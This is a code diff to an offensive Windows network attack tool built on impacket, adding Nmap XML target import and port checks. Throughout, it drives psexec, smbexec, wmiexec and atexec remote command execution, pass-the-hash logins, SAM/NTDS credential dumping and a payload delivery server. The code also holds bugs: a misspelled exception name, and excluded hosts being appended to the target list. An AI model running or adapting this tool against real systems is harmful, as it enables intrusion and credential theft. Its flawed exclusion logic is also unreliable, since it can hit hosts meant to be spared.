@@ -2,15 +2,19 @@
 '''
 Libraries
 '''
-import base64, sys, argparse, re, subprocess, os, time, logging, signal, urllib2, cmd, ntpath, string, random, ConfigParser, hashlib, traceback, tempfile 
+import base64, sys, argparse, re, subprocess, os, time, logging, signal, urllib2, cmd, ntpath, string, random, ConfigParser, hashlib, traceback, tempfile, collections
+import xml.etree.ElementTree as etree
 from threading import Thread, Lock, Event
 from Queue import Queue
 from struct import unpack, pack
-from collections import OrderedDict
 try:
     import netifaces
 except:
     sys.exit("[!] Install the netifaces library: pip install netifaces")
+try:
+    import nmap
+except:
+    sys.exit("[!] Install the python-nmap library: pip install python-nmap")
 try:
     import netaddr
 except:
@@ -29,7 +33,7 @@ try:
     from impacket.dcerpc.v5.dcom import wmi
     from impacket.dcerpc.v5.dtypes import NULL
     from impacket.examples import remcomsvc, serviceinstall, logger 
-    from impacket.dcerpc.v5 import transport, scmr, wkst, srvs, samr, rpcrt
+    from impacket.dcerpc.v5 import transport, scmr, wkst, srvs, samr, rpcrt, rrp
     from impacket.dcerpc import ndrutils, atsvc
     from impacket.dcerpc.v5.rpcrt import DCERPCException
     from impacket.nt_errors import STATUS_MORE_ENTRIES
@@ -1141,7 +1145,7 @@ class NTDSHashes():
         self.__PEK = None
         self.__cryptoCommon = CryptoCommon()
         self.__hashesFound = {}
-        self.__kerberosKeys = OrderedDict()
+        self.__kerberosKeys = collections.OrderedDict()
 
     def __getPek(self):
         logging.info('Searching for pekList, be patient')
@@ -1402,7 +1406,6 @@ class DumpSecrets:
 
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
-
 
     def connect(self):
         self.__smbConnection = SMBConnection(self.__remoteAddr, self.__remoteAddr)
@@ -2882,6 +2885,113 @@ LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF
 OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 '''
 
+'''
+NMAP PARSER
+'''
+class Nmap_parser:
+    def __init__(self, nmap_xml, verbose=0):
+        self.nmap_xml = nmap_xml
+        self.verbose = verbose
+        self.hosts = {}
+        try:
+            self.run()
+        except Exception, e:
+            print("[!] There was an error %s") % (str(e))
+            sys.exit(1)
+
+    def run(self):
+        # Parse the nmap xml file and extract hosts and place them in a dictionary
+        # Input: Nmap XML file and verbose flag
+        # Return: Dictionary of hosts [iterated number] = [hostname, address, protocol, port, service name, state]
+        if not self.nmap_xml:
+            sys.exit("[!] Cannot open Nmap XML file: %s \n[-] Ensure that your are passing the correct file and format" % (self.nmap_xml))
+        try:
+            tree = etree.parse(self.nmap_xml)
+        except:
+            sys.exit("[!] Cannot open Nmap XML file: %s \n[-] Ensure that your are passing the correct file and format" % (self.nmap_xml))
+        hosts={}
+        services=[]
+        hostname_list=[]
+        root = tree.getroot()
+        hostname_node = None
+        if self.verbose > 0:
+            print ("[*] Parsing the Nmap XML file: %s") % (self.nmap_xml)
+        for host in root.iter('host'):
+            hostname = "Unknown hostname"
+            for addresses in host.iter('address'):
+                hwaddress = "No MAC Address ID'd"
+                ipv4 = "No IPv4 Address ID'd"
+                addressv6 = "No IPv6 Address ID'd"
+                temp = addresses.get('addrtype')
+                if "mac" in temp:
+                    hwaddress = addresses.get('addr')
+                    if self.verbose > 2:
+                        print("[*] The host was on the same broadcast domain")
+                if "ipv4" in temp:
+                    address = addresses.get('addr')
+                    if self.verbose > 2:
+                        print("[*] The host had an IPv4 address")
+                if "ipv6" in temp:
+                    addressv6 = addresses.get('addr')
+                    if self.verbose > 2:
+                        print("[*] The host had an IPv6 address")
+            try:
+                hostname_node = host.find('hostnames').find('hostname')
+            except:
+                if self.verbose > 1:
+                    print ("[!] No hostname found")
+            if hostname_node is not None:
+                hostname = hostname_node.get('name')
+            else:
+                hostname = "Unknown hostname"
+                if self.verbose > 1:
+                    print("[*] The hosts hostname is %s") % (str(hostname_node))
+            hostname_list.append(hostname)
+            for item in host.iter('port'):
+                state = item.find('state').get('state')
+                #if state.lower() == 'open':
+                service = item.find('service').get('name')
+                protocol = item.get('protocol')
+                port = item.get('portid')
+                services.append([hostname_list, address, protocol, port, service, hwaddress, state])
+        hostname_list=[]
+        for i in range(0, len(services)):
+            service = services[i]
+            index = len(service) - 1
+            hostname = str1 = ''.join(service[0])
+            address = service[1]
+            protocol = service[2]
+            port = service[3]
+            serv_name = service[4]
+            hwaddress = service[5]
+            state = service[6]
+            self.hosts[i] = [hostname, address, protocol, port, serv_name, hwaddress, state]
+            if self.verbose > 2:
+                print ("[+] Adding %s with an IP of %s:%s with the service %s")%(hostname,address,port,serv_name)
+        if self.hosts:
+            if self.verbose > 4:
+                print ("[*] Results from NMAP XML import: ")
+                for key, entry in self.hosts.iteritems():
+                    print("[*] %s") % (str(entry))
+            if self.verbose > 0:
+                print ("[+] Parsed and imported unique ports %s") % (str(i+1))
+        else:
+            if self.verbose > 0:
+                print ("[-] No ports were discovered in the NMAP XML file")
+
+    def hosts_return(self):
+        # A controlled return method
+        # Input: None
+        # Returned: The processed hosts
+        try:
+             return self.hosts
+        except Exception as e:
+            print("[!] There was an error returning the data %s") % (e)
+
+'''
+TIMEOUT SIGNAL TERMINATION
+'''
+
 class Timeout():
     """Timeout class using ALARM signal."""
     class Timeout(Exception):
@@ -3081,6 +3191,10 @@ class Obfiscator:
         self.command = self.packager(text)
         self.unprotected_command = self.clearer(text)
 
+'''
+LOCAL INTERFACE DETECTION FUNCTIONS
+'''
+
 def get_interfaces():
     interfaces = netifaces.interfaces()
     return interfaces
@@ -3119,6 +3233,10 @@ def get_networks(gateways_dict):
         networks_dict[iface] = network
     return networks_dict
 
+'''
+HASH MANIPULATION FUNCTIONS
+'''
+
 def hash_test(LM, NTLM, pwd):
     print("[*] Hash detected")
     blank_ntlm = re.search(r'31d6cfe0d16ae931b73c59d7e0c089c0',NTLM, re.IGNORECASE)
@@ -3138,6 +3256,10 @@ def hash_test(LM, NTLM, pwd):
     print("[*] Your formated hash is: %s") % (hash)
     pwd = ""
     return(LM, NTLM, pwd, hash)
+
+'''
+CATAPULT SERVER FUNCTIONS
+'''
 
 def delivery_server(port, working_dir, delivery_method, share_name):
     sub_proc = None
@@ -3173,8 +3295,18 @@ def smb_server(working_dir, share_name):
     # TODO: ADD IN TEST CASE FOR VERIFYING SMB SERVER STARTED USING pysmb
     return sub_proc
 
-def atexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks):
+'''
+METHOD FUNCTIONS
+'''
+
+def atexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port):
     for dst in final_targets:
+        if scan_type:
+            state = verify_open(verbose, scan_type, verify_port, dst)
+            if not state:
+                if verbose > 1:
+                    print("[-] Host %s port %s is closed") % (dst, verify_port)
+                continue
         if attacks:
             srv = delivery_server(src_port, cwd, delivery, share_name)
         if hash:
@@ -3200,8 +3332,14 @@ def atexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, p
                srv.terminate()
                print("[*] Shutting down the catapult %s server for %s"  % (str(delivery), str(dst)))
 
-def psexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory):
+def psexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port):
     for dst in final_targets:
+        if scan_type:
+            state = verify_open(verbose, scan_type, verify_port, dst)
+            if not state:
+                if verbose > 1:
+                    print("[-] Host %s port %s is closed") % (dst, verify_port)
+                continue 
         if attacks:
             #print(instructions)
             srv = delivery_server(src_port, cwd, delivery, share_name)
@@ -3215,8 +3353,14 @@ def psexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, p
             srv.terminate()
             print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
 
-def smbexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions):
+def smbexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port):
     for dst in final_targets:
+        if scan_type:
+            state = verify_open(verbose, scan_type, verify_port, dst)
+            if not state:
+                if verbose > 1:
+                    print("[-] Host %s port %s is closed") % (dst, verify_port)
+                continue
         if attacks:
             print(instructions)
             srv = delivery_server(src_port, cwd, delivery, share_name)
@@ -3230,8 +3374,14 @@ def smbexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, 
             srv.terminate()
             print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
 
-def wmiexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output):
+def wmiexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port):
     for dst in final_targets:
+        if scan_type:
+            state = verify_open(verbose, scan_type, verify_port, dst)
+            if not state:
+                if verbose > 1:
+                    print("[-] Host %s port %s is closed") % (dst, verify_port)
+                continue
         if attacks and encoder:
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
@@ -3250,7 +3400,7 @@ def wmiexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, 
                         srv.terminate()
                         print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
                         print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
-                        pass
+                        continue # changed from pass
         elif attacks and not encoder:
             if hash:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
@@ -3269,7 +3419,7 @@ def wmiexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, 
                         srv.terminate()
                         print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
                         print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
-                        pass
+                        continue # changed from pass pass
         else:
             with Timeout(100):
                 try:
@@ -3282,10 +3432,16 @@ def wmiexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, 
                         srv.terminate()
                         print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
                         print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
-                        pass
+                        continue #changed from pass
 
-def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods):              
+def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port): 
     for dst in final_targets:
+        if scan_type:
+            state = verify_open(verbose, scan_type, verify_port, dst)
+            if not state:
+                if verbose > 1:
+                    print("[-] Host %s port %s is closed") % (dst, verify_port)
+                continue
         if methods:
             sys.exit("[!] The --scout option is run without methods")
         if hash:
@@ -3296,13 +3452,19 @@ def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods
         shell = USERENUM(username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, options=opted)
         shell.run()
 
-def sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, final_targets, pwd):
+def sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, final_targets, pwd, scan_type, verbose, verify_port):
     for dst in final_targets:
+        if scan_type:
+            state = verify_open(verbose, scan_type, verify_port, dst)
+            if not state:
+                if verbose > 1:
+                    print("[-] Host %s port %s is closed") % (dst, verify_port)
+                continue
         if hash:
             print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
         else:
             print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
-        shell = secretsdump.DumpSecrets(address = dst, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
+        shell = DumpSecrets(address = dst, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
         try:
             shell.dump()
         except Execption, e:
@@ -3342,6 +3504,88 @@ def instructions_func(payload, src_port, command, unprotected_command, smbexec_c
            instructions = prep + post
     return(instructions)
 
+'''
+NMAP FUNCTIONS
+'''
+
+def unique_host_dict(hosts, verbose):
+    count = 0
+    hosts_dict = {}
+    processed_hosts = {}
+    if not hosts:
+        sys.exit("[!] There was an issue processing the data")
+    for inst in hosts:
+        hosts_temp = inst.hosts_return()
+        if hosts_temp is not None:
+            for k, v in hosts_temp.iteritems():
+                hosts_dict[count] = v
+                count+=1
+            hosts_temp.clear()
+    if verbose > 2:
+        for key, value in hosts_dict.iteritems():
+            print("[*] Key: %s Value: %s") % (key,value)
+    temp = [(k, hosts_dict[k]) for k in hosts_dict]
+    temp.sort()
+    key = 0
+    for k, v in temp:
+        compare = lambda x, y: collections.Counter(x) == collections.Counter(y)
+        if str(v) in str(processed_hosts.values()):
+            continue
+        else:
+            key+=1
+            processed_hosts[key] = v
+    return(processed_hosts)
+
+def xml_list_process(xml, verbose):
+    xml_list = []
+    hosts = []
+    # Instantiation for proof of concept
+    if "," in xml:
+        xml_list = xml.split(',')
+    else:
+        xml_list.append(xml)
+    for x in xml_list:
+        try:
+            tree_temp = etree.parse(x)
+        except:
+            sys.exit("[!] Cannot open XML file: %s \n[-] Ensure that your are passing the correct file and format" % (x))
+        try:
+            root = tree_temp.getroot()
+            name = root.get("scanner")
+            if name is not None and "nmap" in name:
+                if verbose > 1:
+                    print ("[*] File being processed is an NMAP XML")
+                hosts.append(Nmap_parser(x, verbose))
+            else:
+                print("[!] File % is not an NMAP XML") % (str(x))
+                sys.exit(1)
+        except Exception, e:
+            print("[!] Processing of file %s failed %s") % (str(x), str(e))
+            sys.exit(1)
+    processed_hosts = unique_host_dict(hosts, verbose)
+    return(processed_hosts)
+
+def verify_open(verbose, scan_type, port, dst):
+    nm = nmap.PortScanner()
+    if "tcp" in scan_type:
+        if verbose > 1:
+           print("[*] Checking to see if the port %s is open on %s by TCP Connect scan") % (port, dst)
+        scan_args = '-sT -p %s' % (port)
+        nm.scan(hosts=dst, arguments=scan_args)
+    elif "syn" in scan_type:
+        if verbose > 1:
+           print("[*] Checking to see if the port %s is open on %s by SYN Scan scan") % (port, dst)
+        scan_args = '-sS -p %s' % (port)
+        nm.scan(hosts=dst, arguments=scan_args)
+    try:
+        output = nm[dst]['tcp'][int(port)]['state']
+    except Exception, e:
+        output = "closed"
+    if "open" in output:
+        return(True)
+    else:
+        return(False)
+
 def main():
     # If script is executed at the CLI
     usage = '''
@@ -3377,10 +3621,14 @@ Create Pasteable Double Encoded Script:
     attack.add_argument("--executor", action="store_true", dest="executor", help="Execute a PowerShell Script")
     attack.add_argument("--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe")
     attack.add_argument("--group-members", action="store", dest="group", help="Identifies members of Domain Groups through PowerShell")
-    remote_attack.add_argument("-t", action="store", dest="target", default=None, help="The targets you are attempting to exploit")
-    remote_attack.add_argument("-e", action="store", dest="exceptor", default=None, help="The exceptions to the targets you do not want to exploit, yours is inlcuded by default")
-    remote_attack.add_argument("-tl", action="store", dest="target_filename", default=None, help="The targets file with systems you want to exploit, delinated by new lines")
-    remote_attack.add_argument("-el", action="store", dest="exception_filename", default=None, help="The exceptions file with systems you do not want to exploit, delinated by new lines")
+    remote_attack.add_argument("-t", action="store", dest="target", default=None, help="The targets you are attempting to exploit, multiple items can be comma seperated: Accepts IPs, CIDR, Short and Long Ranges")
+    remote_attack.add_argument("-e", action="store", dest="exceptor", default=None, help="The exceptions to the targets you do not want to exploit, yours is inlcuded by default, multiple items can be comma seperated: Accepts IPs, CIDR, Short and Long Ranges")
+    remote_attack.add_argument("-tl", action="store", dest="target_filename", default=None, help="The targets file with systems you want to exploit, delinated by new lines, multiple files can be comma separated")
+    remote_attack.add_argument("-el", action="store", dest="exception_filename", default=None, help="The exceptions file with systems you do not want to exploit, delinated by new lines, multiple files can be comma separated")
+    remote_attack.add_argument("-tnX", action="store", dest="xml_targets", default=None, help="The targets nmap XML with systems you want to exploit, multiple files can be comma separated")
+    remote_attack.add_argument("-enX", action="store", dest="xml_exceptions", default=None, help="The exceptions nmap XML with systems you do not want to exploit, multiple files can be comma separted")
+    remote_attack.add_argument("-sT", action="store_true", dest="scan_tcp", default=False, help="Verify the port is open with nmap TCP Connection scan prior to exploitation")
+    remote_attack.add_argument("-sS", action="store_true", dest="scan_syn", default=False, help="Verify the port is open with nmap SYN Stealth scan prior to exploitation")
     remote_attack.add_argument("--dom", action="store", dest="dom", default="WORKGROUP", help="The domain the user is apart of, defaults to WORKGROUP")
     remote_attack.add_argument("--usr", action="store", dest="usr", default=None, help="The username that will be used to exploit the system")
     remote_attack.add_argument("--pwd", action="store", dest="pwd", default=None, help="The password that will be used to exploit the system")
@@ -3424,7 +3672,6 @@ Create Pasteable Double Encoded Script:
             os.system("/root/setup.sh && rm /root/setup.sh")
         except Exception, e:
             print("[!] An error occurred when executing the installation script: %s") % (e)
-
 
     # Set Constructors
     verbose = args.verbose             # Verbosity level
@@ -3474,6 +3721,10 @@ Create Pasteable Double Encoded Script:
     ntds = args.ntds
     group = args.group
     encoder = args.encoder
+    xml_targets = args.xml_targets
+    xml_exceptions = args.xml_exceptions
+    scan_tcp = args.scan_tcp
+    scan_syn = args.scan_syn
     targets_list = []
     exceptions_list = []
     tgt_list = []
@@ -3492,6 +3743,11 @@ Create Pasteable Double Encoded Script:
     dst = ""
     test = ""
     srv = None
+    verify_port = ''
+    verify_service = ''
+    entry = []
+    processed_xml_targets_dict = {}
+    processed_xml_exceptions_dict = {}
 
     # Configure logger formats for STDERR and output file
     file_handler.setFormatter(format)
@@ -3523,6 +3779,29 @@ Create Pasteable Double Encoded Script:
     if smbexec_cmd or wmiexec_cmd or psexec_cmd or atexec_cmd:
         methods = True
 
+    if scan_tcp:
+        scan_type = "tcp"
+    elif scan_syn:
+        scan_type = "syn"
+    else:
+        scan_type = None
+
+    if not (methods or sam_dump or netview_cmd) and (scan_type):
+        sys.exit("[!] If you are going to execute a verification scan you have to choose a method to use for exploiting a target")
+
+    if smbexec_cmd:
+        verify_port, verify_service = protocol.split('/')
+    if atexec_cmd:
+        verify_port, verify_service = protocol.split('/')
+    if psexec_cmd:
+        verify_port, verify_service = protocol.split('/')
+    if wmiexec_cmd:
+        verify_port = "135"
+    if sam_dump:
+        verify_port = "445"
+    if netview_cmd:
+        verify_port = "445"
+
     if invoker  == None and methods == False:
         print("[!] This script requires either a command, an invoker attack, or a downloader attack")
         parser.print_help()
@@ -3551,7 +3830,7 @@ Create Pasteable Double Encoded Script:
         if usr == None or pwd == None:
             print(2)
             sys.exit("[!] If you are trying to exploit a system you need a username and password")
-        if target == None and target_filename == None:
+        if target == None and target_filename == None and xml_targets == None:
             sys.exit("[!] If you are trying to exploit a system you need at least one target")
 
     gateways = get_gateways()
@@ -3566,6 +3845,20 @@ Create Pasteable Double Encoded Script:
         with open(target_filename) as f:
             targets_list = [line.rstrip() for line in f]
 
+    if xml_targets:
+        processed_xml_targets_dict = xml_list_process(xml_targets, verbose)
+    if xml_exceptions:
+        processed_xml_exceptions_dict = xml_list_process(xml_exceptions, verbose)
+
+    for key, entry in processed_xml_targets_dict.iteritems():
+        if "tcp" in entry[2] and verify_port in entry[3] and "open" in entry[6]:
+            if verbose > 1:
+                print("[+] Adding %s to target list") % (entry[1])
+            targets_list.append(entry[1])
+        if verbose > 2:
+            print("[*] Hostname: %s IP: %s Protocol: %s Port: %s Service: %s State: %s MAC address: %s" % (entry[0], entry[1], entry[2], entry[3], entry[4], entry[6], entry[5]))
+
+    # Process targets
     if target and "," in target:
         targets_list.extend(target.split(','))
     elif target:
@@ -3584,10 +3877,19 @@ Create Pasteable Double Encoded Script:
                 sys.exit(1)
     else:
         tgt_list.extend(targets_list)
-
+    
+    # Process exceptions
     if exception_filename:
         with open(exception_filename) as f:
             exceptions_list = [line.rstrip() for line in f]
+
+    for key, entry in processed_xml_exceptions_dict.iteritems():
+        if "tcp" in entry[2] and verify_port in entry[3] and "open" in entry[6]:
+            if verbose > 1:
+                print("[+] Adding %s to exceptions list") % (entry[1])
+            targets_list.append(entry[1])
+        if verbose > 2:
+            print("[*] Hostname: %s IP: %s Protocol: %s Port: %s Service: %s State: %s MAC address: %s" % (entry[0], entry[1], entry[2], entry[3], entry[4], entry[6], entry[5]))
 
     if exceptor and "," in exceptor:
         exceptions_list.extend(targets.split(','))
@@ -3658,19 +3960,19 @@ Create Pasteable Double Encoded Script:
         sys.exit("[!] You do not execute the --secrets-dump with a method, it should be executed on its own.")
     if not final_targets and not execution:
         sys.exit("[!] No targets to exploit or commands to provide")
-
+ 
     if psexec_cmd:
-        psexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory)
+        psexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port)
     elif wmiexec_cmd:
-        wmiexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output)
+        wmiexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port)
     elif netview_cmd:
-        netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods)
+        netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port)
     elif smbexec_cmd:
-        smbexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions)
+        smbexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port)
     elif atexec_cmd:
-        atexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks)
+        atexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port)
     elif sam_dump:
-        sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, final_targets, pwd)
+        sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, final_targets, pwd, scan_type, verbose, verify_port)
     else:
         print(instructions)
 
